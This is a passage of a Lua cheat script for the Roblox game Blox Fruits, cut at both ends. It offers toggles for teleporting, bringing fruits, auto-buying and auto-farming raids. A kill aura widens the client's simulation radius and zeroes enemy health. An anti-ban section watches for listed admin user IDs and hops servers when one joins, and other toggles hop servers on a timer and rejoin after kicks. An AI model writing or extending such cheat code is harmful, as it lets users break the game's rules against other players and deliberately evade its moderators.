    Mansion = CFrame.new(-12551, 337, -7476),
    ["Port Town"] = CFrame.new(-95, 11, 5455),
    ["Great Tree"] = CFrame.new(2681.27, 1682.8, -7190.98),
    ["Castle On The Sea"] = CFrame.new(-5074.45, 314.51, -2991.05),
    MiniSky = CFrame.new(-260.65, 49325.8, -35253.57),
    ["Hydra Island"] = CFrame.new(5657.18896, 1013.40778, -337.924011),
    ["Floating Turtle"] = CFrame.new(-13488.9727, 333.154938, -7657.83984),
    ["Haunted Castle"] = CFrame.new(-9516, 142, 5537),
    ["Ice Cream Island"] = CFrame.new(-874, 66, -10915),
    ["Peanut Island"] = CFrame.new(-2062, 50, -10232),
    ["Cake Island"] = CFrame.new(-1884, 19, -11666),
    ["Cocoa Island"] = CFrame.new(87, 73, -12319),
    ["Candy Island"] = CFrame.new(-1014, 149, -14555),
    ["Tiki Outpost"] = CFrame.new(-16101, 12, 380),
    ["Submerged Island"] = CFrame.new(-16267.8, 25.4, 1373.2),
}

v6:AddDropdown({
    Name = "Select Island",
    Options = tbl3,
    MultiSelect = false,
    Default = "",
    Callback = function(selectIsland)
        getgenv().SelectIsland = selectIsland
    end,
})

local v10 = nil

v10 = v6:AddToggle({
    Name = "Teleport To Island",
    Default = false,
    Callback = function(teleportIsland)
        getgenv().TeleportIsland = teleportIsland
        _G.Travelis = teleportIsland

        if teleportIsland then
            spawn(function()
                while getgenv().TeleportIsland do
                    task.wait()
                    local selectIsland = getgenv().SelectIsland
                    local v11 = tbl4[selectIsland]
                    if not v11 then
                        task.wait(1)
                        continue
                    end
                    local character = localPlayer.Character
                    local humanoidRootPart2 = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not humanoidRootPart2 then
                        task.wait(1)
                        continue
                    end

                    if selectIsland == "Sky Island 2" then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-4607.82, 872.54, -1667.55))
                    elseif selectIsland == "Sky Island 3" then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-7894.61, 5547.14, -380.29))
                    elseif selectIsland == "Under Water Island" then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.85, 11.67, 1819.78))
                    elseif selectIsland == "Submerged Island" then
                        tween(v11)
                        local character2, humanoidRootPart3, v12

                        repeat
                            task.wait()
                            character2 = localPlayer.Character
                            humanoidRootPart3 = character2 and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                            v12 = humanoidRootPart3
                        until not getgenv().TeleportIsland or v12 and (v12.Position - v11.Position).Magnitude < 15

                        game.ReplicatedStorage.Modules.Net["RF/SubmarineWorkerSpeak"]:InvokeServer("TravelToSubmergedIsland")
                    elseif selectIsland ~= "Mini Sky Island" and selectIsland ~= "MiniSky" then
                        tween(v11)
                        local character2, humanoidRootPart3, v12

                        repeat
                            task.wait()
                            character2 = localPlayer.Character
                            humanoidRootPart3 = character2 and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                            v12 = humanoidRootPart3
                        until not getgenv().TeleportIsland or v12 and (v12.Position - v11.Position).Magnitude < 15
                    else
                        local position = v11.Position
                        local cframe = CFrame.new(position.X, humanoidRootPart2.Position.Y, position.Z)
                        tween(cframe)
                        local character2, humanoidRootPart3, v12

                        repeat
                            task.wait()
                            character2 = localPlayer.Character
                            humanoidRootPart3 = character2 and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                            v12 = humanoidRootPart3
                        until not getgenv().TeleportIsland or v12 and (Vector3.new(v12.Position.X, v12.Position.Y, v12.Position.Z) - Vector3.new(position.X, v12.Position.Y, position.Z)).Magnitude < 15

                        if getgenv().TeleportIsland then
                            fn(v11)
                        end
                    end

                    task.wait(0.1)
                    getgenv().TeleportIsland = false
                    _G.Travelis = false

                    if v10 then
                        v10:Set(false)
                    end

                    break
                end
            end)
        else
            _G.Travelis = false
        end
    end,
})

v5:AddSection("Fruits")

v5:AddToggle({
    Name = "Auto Store Fruit",
    Default = false,
    Callback = function(autoStoreFruits)
        getgenv().AutoStoreFruits = autoStoreFruits
    end,
})

spawn(function()
    while wait(1) do
        if getgenv().AutoStoreFruits then
            pcall(function()
                FruitRemote()
            end)
        end
    end
end)

v5:AddToggle({
    Name = "Teleport to Fruits",
    Default = false,
    Callback = function(twFruits)
        _G.TwFruits = twFruits
    end,
})

spawn(function()
    while wait(1) do
        if _G.TwFruits then
            pcall(function()
                for k, child in pairs(workspace:GetChildren()) do
                    if string.find(child.Name, "Fruit") then
                        tween(child.Handle.CFrame)
                    end
                end
            end)
        end
    end
end)

v5:AddToggle({
    Name = "Bring Fruits",
    Default = false,
    Callback = function(brFruits)
        _G.BrFruits = brFruits
    end,
})

spawn(function()
    while wait(1) do
        if _G.BrFruits then
            pcall(function()
                for k, child in pairs(workspace:GetChildren()) do
                    if string.find(child.Name, "Fruit") then
                        fn(child.Handle.CFrame)
                    end
                end
            end)
        end
    end
end)

v5:AddToggle({
    Name = "Auto random Fruit",
    Default = false,
    Callback = function(randomAuto)
        _G.Random_Auto = randomAuto
    end,
})

spawn(function()
    while wait(1) do
        pcall(function()
            if _G.Random_Auto then
                ReplicatedStorage.Remotes.CommF_:InvokeServer("Cousin", "Buy")
            end
        end)
    end
end)

if World2 or World3 then
    v5:AddSection("Raid")

    v5:AddDropdown({
        Name = "Select Chip",
        Options = tbl,
        MultiSelect = false,
        Default = Select,
        Callback = function(selectChip)
            _G.SelectChip = selectChip
        end,
    })

    _G.SelectChip = tbl[1]

    local function fn11()
        if World2 then
            tween(CFrame.new(-6528.33252, 305.598297, -4752.26953, 0.989115953, 2.37764954e-08, -0.14713794, -2.2435195e-08, 1, 1.07755049e-08, 0.14713794, -7.35715577e-09, 0.989115953))
        elseif World3 then
            ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-5097.93164, 316.447021, -3142.66602))
            task.wait(1)
            tween(CFrame.new(-5017.40869, 314.844055, -2823.0127))
        end
    end

    v5:AddToggle({
        Name = "Auto Buy Chip",
        Default = false,
        Callback = function(muachip)
            _G.Muachip = muachip

            if muachip then
                spawn(function()
                    while _G.Muachip do
                        if not LayItems("Special Microchip") then
                            fn11()
                            task.wait(1)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", _G.SelectChip)
                        end

                        task.wait()
                    end
                end)
            end
        end,
    })

    v5:AddToggle({
        Name = "Auto Start Raid",
        Default = false,
        Callback = function(autoStartRaid)
            _G.Auto_StartRaid = autoStartRaid
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.Auto_StartRaid then
                    local topHUDList = localPlayer.PlayerGui.Main.TopHUDList
                    local raidTimer = topHUDList and localPlayer.PlayerGui.Main.TopHUDList.RaidTimer

                    if (not raidTimer or not raidTimer.Visible) and LayItems("Special Microchip") then
                        fn11()
                        task.wait(1)

                        if World2 then
                            fireclickdetector(workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                        elseif World3 then
                            fireclickdetector(workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
                        end
                    end
                end
            end)
        end
    end)

    v5:AddToggle({
        Name = "Teleport To Lab",
        Default = false,
        Callback = function(tpLab)
            _G.TpLab = tpLab

            if tpLab then
                spawn(function()
                    while _G.TpLab do
                        fn11()
                        task.wait(1)
                    end
                end)
            end
        end,
    })

    v5:AddToggle({
        Name = "Kill Aura Raid (Đảo 4-5)",
        Default = false,
        Callback = function(killAuraRaidBeta_)
            getgenv().KillAuraRaidBeta = killAuraRaidBeta_
        end,
    })

    IsIslandRaid = function(arg)
        local character = localPlayer.Character
        local humanoidRootPart2 = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return
        end
        local v11 = nil
        local huge = math.huge

        for k, child in pairs(workspace._WorldOrigin.Locations:GetChildren()) do
            if child.Name == "Island " .. arg then
                local magnitude = (child.Position - humanoidRootPart2.Position).Magnitude

                if magnitude < huge then
                    huge = magnitude
                    v11 = child
                end
            end
        end

        return v11
    end

    getNextIsland = function()
        local tbl5 = {5, 4, 3, 2, 1}
        local character = localPlayer.Character
        local humanoidRootPart2 = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return
        end

        for i, v11 in ipairs(tbl5) do
            local v12 = IsIslandRaid(v11)
            if v12 and (v12.Position - humanoidRootPart2.Position).Magnitude <= 4500 then
                return v12
            end
        end
    end

    getCurrentRaidIslandNum = function()
        local character = localPlayer.Character
        local humanoidRootPart2 = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return nil
        end
        local huge = math.huge
        local v11 = nil

        for i = 1, 5 do
            for k, child in pairs(workspace._WorldOrigin.Locations:GetChildren()) do
                if child.Name == "Island " .. i then
                    local magnitude = (child.Position - humanoidRootPart2.Position).Magnitude

                    if magnitude <= 750 and magnitude < huge then
                        huge = magnitude
                        v11 = i
                    end
                end
            end
        end

        return v11
    end

    killAuraRaidBeta = function()
        local character = localPlayer.Character
        local humanoidRootPart2 = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return
        end

        pcall(function()
            sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
        end)

        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if child:FindFirstChild("HumanoidRootPart") and child:FindFirstChild("Humanoid") and child.Humanoid.Health > 0 and (child.HumanoidRootPart.Position - humanoidRootPart2.Position).Magnitude <= 600 then
                pcall(function()
                    child.HumanoidRootPart.CFrame = humanoidRootPart2.CFrame * CFrame.new(0, 0, -4)
                    child.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero

                    if child.Humanoid:FindFirstChild("Animator") then
                        child.Humanoid.Animator:Destroy()
                    end

                    child.Humanoid.WalkSpeed = 0
                    child.Humanoid.JumpPower = 0
                    child.Humanoid.Health = 0
                end)
            end
        end
    end

    local connection = nil
    local v11 = nil

    startRaidIdleKillAura = function()
        local v12 = getCurrentRaidIslandNum()
        if connection and v11 == v12 then
            return
        end

        if connection then
            connection:Disconnect()
            connection = nil
        end

        v11 = v12

        connection = game:GetService("RunService").Heartbeat:Connect(function()
            if _G.Raiding and getgenv().KillAuraRaidBeta then
                local v13 = getCurrentRaidIslandNum()

                if v13 and (v13 == 4 or v13 == 5) then
                    if v13 == v11 then
                        local character = localPlayer.Character
                        local humanoidRootPart2 = character and character:FindFirstChild("HumanoidRootPart")
                        if not humanoidRootPart2 then
                            return
                        end

                        pcall(function()
                            sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
                        end)

                        for k, child in pairs(workspace.Enemies:GetChildren()) do
                            if child:FindFirstChild("HumanoidRootPart") and child:FindFirstChild("Humanoid") and child.Humanoid.Health > 0 and (child.HumanoidRootPart.Position - humanoidRootPart2.Position).Magnitude <= 600 then
                                pcall(function()
                                    if child.Humanoid:FindFirstChild("Animator") then
                                        child.Humanoid.Animator:Destroy()
                                    end

                                    child.Humanoid.WalkSpeed = 0
                                    child.Humanoid.JumpPower = 0
                                    child.Humanoid.Health = 0
                                end)
                            end
                        end

                        return
                    end

                    connection:Disconnect()
                    connection = nil
                    v11 = nil
                    return
                end

                connection:Disconnect()
                connection = nil
                v11 = nil
                return
            end

            connection:Disconnect()
            connection = nil
            v11 = nil
        end)
    end

    attackNearbyEnemies = function()
        local character, humanoidRootPart2, v12, v13, v14, v15, v16, v17, n
        n = 1

        while true do
            if n == 1 then
                character = localPlayer.Character
                humanoidRootPart2 = character

                if character then
                    n = 2
                else
                    n = 3
                end
            elseif n == 2 then
                humanoidRootPart2 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
                n = 3
            elseif n == 3 then
                if humanoidRootPart2 then
                    n = 4
                else
                    n = 10
                end
            elseif n == 4 then
                v12, v13, v14 = pairs(workspace.Enemies:GetChildren())
                v15 = v14
                n = 5
            elseif n == 5 then
                v16, v17 = v12(v13, v15)

                if v16 == nil then
                    n = 9
                else
                    n = 6
                end
            elseif n == 6 then
                v15 = v16

                if v17:FindFirstChild("HumanoidRootPart") and v17:FindFirstChild("Humanoid") and v17.Humanoid.Health > 0 and (v17.HumanoidRootPart.Position - humanoidRootPart2.Position).Magnitude <= 1000 then
                    n = 7
                else
                    n = 5
                end
            elseif n == 7 then
                if _G.Raiding and v17 and v17.Parent and v17:FindFirstChild("Humanoid") and v17.Humanoid.Health > 0 then
                    n = 8
                else
                    n = 5
                end
            elseif n == 8 then
                Kill(v17, true)
                task.wait(0.1)
                n = 7
            elseif n == 9 then
                return
            elseif n == 10 then
                return
            end
        end
    end

    v5:AddToggle({
        Name = "Auto Farm Raid",
        Default = false,
        Callback = function(raiding)
            _G.Raiding = raiding
        end,
    })

    spawn(function()
        while task.wait(1) do
            if _G.Raiding then
                local raidTimer = localPlayer.PlayerGui.Main.TopHUDList.RaidTimer

                if raidTimer and raidTimer.Visible then
                    local v12 = getCurrentRaidIslandNum()

                    if getgenv().KillAuraRaidBeta and (v12 == 4 or v12 == 5) then
                        startRaidIdleKillAura()
                        local v13 = getNextIsland()

                        if v13 then
                            tween(v13.CFrame * CFrame.new(0, 60, 0))
                        end
                    else
                        attackNearbyEnemies()
                        local v13 = getNextIsland()

                        if v13 then
                            tween(v13.CFrame * CFrame.new(0, 60, 0))
                        end
                    end
                end
            end
        end
    end)

    v5:AddToggle({
        Name = "Auto Awakening",
        Default = false,
        Callback = function(autoAwakener)
            _G.Auto_Awakener = autoAwakener
        end,
    })

    spawn(function()
        while wait(1) do
            pcall(function()
                if _G.Auto_Awakener then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Check")
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
                end
            end)
        end
    end)
end

v8:AddSection("Fighting Style")
game:GetService("Players")
local ReplicatedStorage2 = game:GetService("ReplicatedStorage")

local tbl5 = {
    ["Black Leg"] = {
        money = "$150,000",
        frag = "0",
        npcName = "Dark Step Teacher",
        command = "BuyBlackLeg",
    },
    Electro = {
        money = "$550,000",
        frag = "0",
        npcName = "Mad Scientist",
        command = "BuyElectro",
    },
    ["Water Kung Fu"] = {
        money = "$750,000",
        frag = "0",
        npcName = "Water Kung-fu Teacher",
        command = "BuyFishmanKarate",
    },
    ["Dragon Claw"] = {
        money = "$0",
        frag = "1500",
        npcName = "Sabi",
        command = {"BlackbeardReward", "DragonClaw", "2"},
    },
    Superhuman = {
        money = "$3,000,000",
        frag = "0",
        npcName = "Martial Arts Master",
        command = "BuySuperhuman",
    },
    ["Death Step"] = {
        money = "$5,000,000",
        frag = "0",
        npcName = "Phoeyu, the Reformed",
        command = "BuyDeathStep",
    },
    ["Sharkman Karate"] = {
        money = "$2,500,000",
        frag = "5000",
        npcName = "Sharkman Teacher",
        command = "BuySharkmanKarate",
    },
    ["Electric Claw"] = {
        money = "$3,000,000",
        frag = "5000",
        npcName = "Previous Hero",
        command = "BuyElectricClaw",
    },
    ["Dragon Talon"] = {
        money = "$3,000,000",
        frag = "5000",
        npcName = "Uzoth",
        command = "buydracoracenTalon",
    },
    ["God Human"] = {
        money = "$5,000,000",
        frag = "5000",
        npcName = "Ancient Monk",
        command = "BuyGodhuman",
    },
    ["Sanguine Art"] = {
        money = "$5,000,000",
        frag = "5000",
        npcName = "Shafi",
        command = "BuySanguineArt",
    },
}

local str = "Black Leg"

local function fn11(arg)
    for k, child in pairs(workspace.NPCs:GetChildren()) do
        if child.Name == arg and child:FindFirstChild("HumanoidRootPart") then
            return child.HumanoidRootPart.CFrame
        end
    end

    return nil
end

local function fn12(arg)
    local v11 = tbl5[arg]
    if not v11 then
        return
    end
    local v12 = fn11(v11.npcName)
    if not v12 then
        return
    end
    tween3(v12)
    local commF = ReplicatedStorage2.Remotes.CommF_

    if type(v11.command) == "table" then
        commF:InvokeServer(unpack(v11.command))
    else
        commF:InvokeServer(v11.command)
    end
end

local Status = v8:AddParagraph("Status", "Selected: Black Leg | $150,000 | 0F")

v8:AddDropdown({
    Name = "Select Melee",
    Options = {
        "Black Leg",
        "Electro",
        "Water Kung Fu",
        "Dragon Claw",
        "Superhuman",
        "Death Step",
        "Sharkman Karate",
        "Electric Claw",
        "Dragon Talon",
        "God Human",
        "Sanguine Art",
    },
    Default = "Black Leg",
    Callback = function(arg)
        str = arg
        local v11 = tbl5[arg]
        Status:Set("Selected: " .. arg .. " | " .. v11.money .. " | " .. v11.frag .. "F")
    end,
})

v8:AddButton({
    Name = "Buy",
    Callback = function()
        fn12(str)
    end,
})

v8:AddSection("Ability")

v8:AddButton({
    Name = "Buy Buso",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyHaki", "Buso")
    end,
})

v8:AddButton({
    Name = "Buy Geppo",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyHaki", "Geppo")
    end,
})

v8:AddButton({
    Name = "Buy Soru",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyHaki", "Soru")
    end,
})

v8:AddButton({
    Name = "Buy Ken",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("KenTalk", "Buy")
    end,
})

v8:AddSection("Sword")

v8:AddButton({
    Name = "Buy Cutlass",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Cutlass")
    end,
})

v8:AddButton({
    Name = "Buy Katana",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Katana")
    end,
})

v8:AddButton({
    Name = "Buy Iron Mace",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Iron Mace")
    end,
})

v8:AddButton({
    Name = "Buy Duel Katana",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Duel Katana")
    end,
})

v8:AddButton({
    Name = "Buy Triple Katana",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Triple Katana")
    end,
})

v8:AddButton({
    Name = "Buy Pipe",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Pipe")
    end,
})

v8:AddButton({
    Name = "Buy Dual-Headed Blade",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Dual-Headed Blade")
    end,
})

v8:AddButton({
    Name = "Buy Bisento",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Bisento")
    end,
})

v8:AddButton({
    Name = "Buy Soul Cane",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Soul Cane")
    end,
})

v8:AddSection("Gun")

v8:AddButton({
    Name = "Buy Slingshot",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Slingshot")
    end,
})

v8:AddButton({
    Name = "Buy Musket",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Musket")
    end,
})

v8:AddButton({
    Name = "Buy Dual Flintlock",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Dual Flintlock")
    end,
})

v8:AddButton({
    Name = "Buy Flintlock",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Flintlock")
    end,
})

v8:AddButton({
    Name = "Buy Refined Flintlock",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Refined Flintlock")
    end,
})

v8:AddButton({
    Name = "Buy Cannon",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Cannon")
    end,
})

v8:AddButton({
    Name = "Buy Kabucha",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Slingshot", "2")
    end,
})

v8:AddSection("Accessory")

v8:AddButton({
    Name = "Buy Tomoe Ring",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Tomoe Ring")
    end,
})

v8:AddButton({
    Name = "Buy Black Cape",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Black Cape")
    end,
})

v8:AddButton({
    Name = "Buy Swordsman Hat",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyItem", "Swordsman Hat")
    end,
})

v8:AddSection("Ectoplasm")

v8:AddButton({
    Name = "Buy Bizarre Rifle",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 1)
    end,
})

v8:AddButton({
    Name = "Buy Ghoul Mask",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 2)
    end,
})

v8:AddSection("Fragments")

v8:AddButton({
    Name = "Buy Refund Stats",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "2")
    end,
})

v8:AddButton({
    Name = "Buy Reroll Race",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "2")
    end,
})

v8:AddSection("Race")

v8:AddButton({
    Name = "Change Ghoul Race",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", " Change", 4)
    end,
})

v8:AddButton({
    Name = "Buy Cyborg Race",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CyborgTrainer", " Buy")
    end,
})

v8:AddSection("Craft Items")

v8:AddButton({
    Name = "Craft Dragon Heart",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "Dragonheart")
    end,
})

v8:AddButton({
    Name = "Craft Dragon Storm",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "Dragonstorm")
    end,
})

v8:AddButton({
    Name = "Craft Dino Hood",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "DinoHood")
    end,
})

v8:AddButton({
    Name = "Craft Shark Tooth",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "SharkTooth")
    end,
})

v8:AddButton({
    Name = "Craft Terror Jaw",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "TerrorJaw")
    end,
})

v8:AddButton({
    Name = "Craft Shark Anchor",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "SharkAnchor")
    end,
})

v8:AddButton({
    Name = "Craft Leviathan Crown",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "LeviathanCrown")
    end,
})

v8:AddButton({
    Name = "Craft Leviathan Shield",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "LeviathanShield")
    end,
})

v8:AddButton({
    Name = "Craft Leviathan Boat",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "LeviathanBoat")
    end,
})

v8:AddButton({
    Name = "Craft Legendary Scroll",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "LegendaryScroll")
    end,
})

v8:AddButton({
    Name = "Craft Mythical Scroll",
    Callback = function()
        ReplicatedStorage.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "MythicalScroll")
    end,
})

v9:AddSection("Anti Ban")

v9:AddToggle({
    Name = "Hop if admin join",
    Default = true,
    Callback = function(antiBand)
        _G.AntiBand = antiBand
    end,
})

local tbl6 = {17884881, 120173604, 912348}

spawn(function()
    local v11, v12, v13, v14, v15, v16, placeId, jobId, HttpService, serverBrowser, str2, n
    n = 1

    while true do
        if n == 1 then
            if task.wait(1) then
                n = 2
            else
                n = 8
            end
        elseif n == 2 then
            if _G.AntiBand then
                n = 3
            else
                n = 1
            end
        elseif n == 3 then
            v11, v12, v13 = pairs(game:GetService("Players"):GetPlayers())
            v14 = v13
            n = 4
        elseif n == 4 then
            v15, v16 = v11(v12, v14)

            if v15 == nil then
                n = 1
            else
                n = 5
            end
        elseif n == 5 then
            v14 = v15

            if table.find(tbl6, v16.UserId) then
                n = 6
            else
                n = 4
            end
        elseif n == 6 then
            task.wait(2)

            if game:IsLoaded() then
                n = 7
            else
                n = 6
            end
        elseif n == 7 then
            placeId = game.PlaceId
            jobId = game.JobId
            HttpService = game:GetService("HttpService")
            serverBrowser = game:GetService("ReplicatedStorage"):WaitForChild("__ServerBrowser")
            str2 = ""

            HopServer = function()
                local ok, result, nextPageCursor, str3, v17, v18, v19, v20, v21, v22, n2
                n2 = 1

                while true do
                    if n2 == 1 then
                        if task.wait(1) then
                            n2 = 2
                        else
                            n2 = 9
                        end
                    elseif n2 == 2 then
                        ok, result = pcall(function()
                            local jsonDecode = HttpService.JSONDecode
                            local v23 = game
                            local httpGet = v23.HttpGet
                            local str4 = str2 ~= "" and "&cursor=" .. str2 or ""
                            return jsonDecode(HttpService, httpGet(v23, "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100" .. str4))
                        end)

                        if ok and result then
                            n2 = 3
                        else
                            n2 = 1
                        end
                    elseif n2 == 3 then
                        nextPageCursor = result.nextPageCursor
                        str3 = nextPageCursor

                        if nextPageCursor then
                            n2 = 5
                        else
                            n2 = 4
                        end
                    elseif n2 == 4 then
                        str3 = ""
                        n2 = 5
                    elseif n2 == 5 then
                        str2 = str3
                        v17, v18, v19 = pairs(result.data)
                        v20 = v19
                        n2 = 6
                    elseif n2 == 6 then
                        v21, v22 = v17(v18, v20)

                        if v21 == nil then
                            n2 = 1
                        else
                            n2 = 7
                        end
                    elseif n2 == 7 then
                        v20 = v21

                        if v22.id == jobId then
                            n2 = 6
                        else
                            n2 = 8
                        end
                    elseif n2 == 8 then
                        serverBrowser:InvokeServer("teleport", v22.id)
                        n2 = 1
                    elseif n2 == 9 then
                        return
                    end
                end
            end

            task.delay(1, function()
                HopServer()
            end)

            n = 1
        elseif n == 8 then
            return
        end
    end
end)

v9:AddToggle({
    Name = "Auto Hop (30 min)",
    Default = false,
    Callback = function(autoHop30)
        _G.AutoHop30 = autoHop30
    end,
})

spawn(function()
    while task.wait(1800) do
        if _G.AutoHop30 then
            repeat
                task.wait(2)
            until game:IsLoaded()

            local placeId = game.PlaceId
            local jobId = game.JobId
            local HttpService = game:GetService("HttpService")
            local serverBrowser = game:GetService("ReplicatedStorage"):WaitForChild("__ServerBrowser")
            local str2 = ""

            HopServer = function()
                local ok, result, nextPageCursor, str3, v11, v12, v13, v14, v15, v16, n
                n = 1

                while true do
                    if n == 1 then
                        if task.wait(1) then
                            n = 2
                        else
                            n = 9
                        end
                    elseif n == 2 then
                        ok, result = pcall(function()
                            local jsonDecode = HttpService.JSONDecode
                            local v17 = game
                            local httpGet = v17.HttpGet
                            local str4 = str2 ~= "" and "&cursor=" .. str2 or ""
                            return jsonDecode(HttpService, httpGet(v17, "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100" .. str4))
                        end)

                        if ok and result then
                            n = 3
                        else
                            n = 1
                        end
                    elseif n == 3 then
                        nextPageCursor = result.nextPageCursor
                        str3 = nextPageCursor

                        if nextPageCursor then
                            n = 5
                        else
                            n = 4
                        end
                    elseif n == 4 then
                        str3 = ""
                        n = 5
                    elseif n == 5 then
                        str2 = str3
                        v11, v12, v13 = pairs(result.data)
                        v14 = v13
                        n = 6
                    elseif n == 6 then
                        v15, v16 = v11(v12, v14)

                        if v15 == nil then
                            n = 1
                        else
                            n = 7
                        end
                    elseif n == 7 then
                        v14 = v15

                        if v16.id == jobId then
                            n = 6
                        else
                            n = 8
                        end
                    elseif n == 8 then
                        serverBrowser:InvokeServer("teleport", v16.id)
                        n = 1
                    elseif n == 9 then
                        return
                    end
                end
            end

            task.delay(1, function()
                HopServer()
            end)
        end
    end
end)

v9:AddToggle({
    Name = "Rejoin If Kick",
    Default = true,
    Callback = function(arg)
        AutoRejoinKick = arg
    end,
})

spawn(function()
    while wait(Sec) do
        pcall(function()
            if AutoRejoinKick then
                if not rejoinConnection then
                    local connection = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
                        if child.Name == "ErrorPrompt" and child:FindFirstChild("MessageArea") and child.MessageArea:FindFirstChild("ErrorFrame") then
                            game:GetService("TeleportService"):Teleport(game.PlaceId)
                        end
                    end)

                    rejoinConnection = connection
                end
            elseif rejoinConnection then
                rejoinConnection:Disconnect()
                rejoinConnection = nil
            end
        end)
    end
end)

if _G.M1BF then
    local localPlayer2 = game.Players.LocalPlayer

    task.spawn(function()
        local character, tool, humanoidRootPart2, v11, v12, v13, v14, v15, v16, v17, v18, children, v19, v20, v21, v22, v23, v24, v25, humanoidRootPart3
        local humanoid, n
        n = 1

        while true do
            if n == 1 then
                if _G.M1BF and task.wait() then
                    n = 3
                else
                    n = 2
                end
            elseif n == 2 then
                return
            elseif n == 3 then
                character = localPlayer2.Character

                if character then
                    n = 4
                else
                    n = 1
                end
            elseif n == 4 then
                tool = character:FindFirstChildOfClass("Tool")
                humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")

                if tool and tool:FindFirstChild("LeftClickRemote") and humanoidRootPart2 then
                    n = 5
                else
                    n = 1
                end
            elseif n == 5 then
                v11, v12, v13 = ipairs({workspace.Enemies, workspace.Characters})
                v14 = v13
                v15 = v11
                v16 = v12
                n = 6
            elseif n == 6 then
                v17, v18 = v15(v16, v14)

                if v17 == nil then
                    n = 1
                else
                    n = 7
                end
            elseif n == 7 then
                children, v19, v20 = v18:GetChildren()
                v21 = v15
                v22 = v16
                v23 = v20
